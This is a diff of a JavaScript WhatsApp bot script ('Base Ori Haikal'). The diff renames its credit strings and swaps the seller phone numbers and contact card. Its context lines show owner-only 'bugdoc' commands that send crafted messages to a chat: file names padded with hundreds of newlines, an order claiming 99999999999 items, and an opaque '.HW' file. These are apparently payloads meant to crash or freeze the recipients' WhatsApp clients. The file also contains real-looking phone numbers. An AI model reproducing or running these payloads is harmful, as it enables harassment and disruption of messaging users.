@@ -2,7 +2,7 @@
 › Create By Haikal
 › Base Ori Haikal
 
-KALAU MAU RENAME TARO CREDITS GUA : CXZA 935 */
+KALAU MAU RENAME TARO CREDITS GUA : © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 */
 
 //=================================================//
 require('./hwkal')
@@ -130,7 +130,7 @@ const shield2 = {
     "imageMessage": {
         "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
         "mimetype": "image/jpeg",
-        "caption": "CXZA 935 MD",
+        "caption": "© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 MD",
         "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
         "fileLength": "28777",
         "height": 1080,
@@ -152,11 +152,11 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833
 },
 "message": {
 "extendedTextMessage": {
-"text": "© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍 ]️",
+"text": "© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 ]️",
 "previewType": "NONE",
 "contextInfo": {
 "stanzaId": "3EB0382EDBB2",
-"participant": "6285775422460@s.whatsapp.net"
+"participant": "6283149877456@s.whatsapp.net"
 }}}}
 //=================================================//
 const doc = { 
@@ -172,16 +172,16 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `CXZA 935${ngazap(prefix)}`,
+"fileName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
 }}}
 //=================================================//
 const bangkal= (teks) => {
-haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC CXZA 935`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://bit.ly/3RBU6DN`}}}, { quoted: hw })
+haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://bit.ly/3RBU6DN`}}}, { quoted: hw })
 } 
 // Target
 const reply = (teks) => {
-return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC CXZA 935`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://bit.ly/3RBU6DN`}}}, { quoted: hw })
+return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://bit.ly/3RBU6DN`}}}, { quoted: hw })
 } 
 //=================================================//
 const deploy = (teks) => {
@@ -367,7 +367,7 @@ Waktu ${clockString(new Date - afkTime)}
 if (db.data.users[m.sender].afkTime > -1) {
 let user = global.db.data.users[m.sender]
 bangkal(`
-Hello Saya CXZA 935${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
+Hello Saya © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
 Selama ${clockString(new Date - user.afkTime)}
 `.trim())
 user.afkTime = -1
@@ -397,10 +397,10 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "itemCount": 99999999999,	
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${ngazap(prefix)}`,
+"message": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
 "jpegThumbnail": mekih,
-"orderTitle": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${ngazap(prefix)}`,
-"sellerJid": "6285775422460@s.whatsapp.net",
+"orderTitle": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
+"sellerJid": "6283149877456@s.whatsapp.net",
 "token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",	
 }
 }), { userJid: m.chat, quoted: doc })
@@ -411,14 +411,14 @@ case 'bugdoc5': {
 if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 if (isBan) throw sticBanLu(from)
 yy = fs.readFileSync('./baseikal/sound/hwmods.HW')
-haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`CXZA 935 ${buttonkal}.HW` }, {quoted:doc})
+haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 ${buttonkal}.HW` }, {quoted:doc})
 }
 break
 case 'bugdoc3': {
 if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 if (isBan) throw sticBanLu(from)
  ilih = fs.readFileSync('./baseikal/sound/hwmods.HW')
- haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`CXZA 935 ${buttonkal}.HW` }, {quoted:doc})
+ haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 ${buttonkal}.HW` }, {quoted:doc})
  }
  break
 case 'bugdoc2': {
@@ -432,7 +432,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
 "pageCount": 0,
 "mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
-"fileName": `🔥 CXZA 935 🔥\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
+"fileName": `🔥 © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 🔥\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
 "fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
 "directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
 "mediaKeyTimestamp": "1658703206",
@@ -452,7 +452,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
 "pageCount": 0,
 "mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
-"fileName": `🔥 CXZA 935 🔥\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
+"fileName": `🔥 © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 🔥\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
 "fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
 "directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
 "mediaKeyTimestamp": "1659416157",
@@ -490,7 +490,7 @@ var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "imageMessage": {
 "url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
 "mimetype": "image/jpeg",
-"caption": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${ngazap(prefix)}`,
+"caption": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
 "fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
 "fileLength": "42521",
 "height": 426,
@@ -518,7 +518,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
 "pageCount": 0,
 "mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
-"fileName": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${ngazap(prefix)}`,
+"fileName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
 "fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
 "directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
 "mediaKeyTimestamp": "1657288637",
@@ -534,10 +534,10 @@ if (isBan) throw sticBanLu(from)
 
 var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "extendedTextMessage": {
-"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 "matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
 "description": "Undangan Grup WhatsApp",
-"title": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${ngazap(prefix)}`,
+"title": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
 "previewType": "NONE",
 }
 }), { userJid: m.chat, quoted: doc })
@@ -573,10 +573,10 @@ if (isBan) throw sticBanLu(from)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "extendedTextMessage": {
-"text": "https://wa.me/c/6285775422460",
-"matchedText": "https://wa.me/c/6285775422460",
-"description": "Developer © 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
-"title": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${ngazap(prefix)}`,
+"text": "https://wa.me/c/6283149877456",
+"matchedText": "https://wa.me/c/6283149877456",
+"description": "Developer © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
+"title": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
 "previewType": "NONE",
 "jpegThumbnail": messa.imageMessage,
 }
@@ -590,8 +590,8 @@ if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 if (isBan) throw sticBanLu(from)
 var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "contactMessage": {
-"displayName": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${ngazap(prefix)}`,
-"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:Haikal\nitem1.TEL;waid=6285775422460:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer CXZA 935WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:Haikal\nEND:VCARD",
+"displayName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${ngazap(prefix)}`,
+"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:Haikal\nitem1.TEL;waid=6283149877456:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64:/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAA